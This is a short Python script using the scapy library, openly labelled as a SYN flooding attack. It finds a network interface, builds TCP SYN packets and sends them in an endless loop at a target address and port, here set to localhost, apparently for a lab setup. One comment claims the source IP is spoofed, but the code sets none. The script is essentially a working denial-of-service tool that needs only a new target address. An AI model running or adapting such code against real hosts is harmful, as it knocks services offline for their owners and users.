from scapy.all import *
import socket
import netifaces


def get_interface_name(destination_ip, destination_port):
    # Get a list of all network interfaces
    interfaces = netifaces.interfaces()

    # Iterate over each interface and check its IP addresses
    for interface in interfaces:
        addresses = netifaces.ifaddresses(interface)
        if socket.AF_INET in addresses:
            for addr_info in addresses[socket.AF_INET]:
                if 'addr' in addr_info:
                    ip_address = addr_info['addr']
                    # Create a socket for the destination IP and port
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    try:
                        s.bind((ip_address, 0))  # Bind to the interface's IP address
                        # Check if the destination IP and port are reachable through this interface
                        s.connect((destination_ip, destination_port))
                        # If connected successfully, return the interface name
                        return interface
                    except Exception as e:
                        pass
                    finally:
                        s.close()
    return None

def syn_flood(target_ip, target_port, interface="lo"):
    # Craft a SYN packet with a spoofed source IP address
    syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S", seq=12345)
    # Send the SYN packet
    send(syn_packet,iface=interface, verbose=1)

if __name__ == "__main__":
    target_ip = "127.0.0.1"
    target_port = 1234
    interface_name = get_interface_name(target_ip, target_port)
    print("iface:",interface_name)
    print(f"Initiating SYN flooding attack on {target_ip}:{target_port}...")
    while(True):
        syn_flood(target_ip, target_port, interface_name)
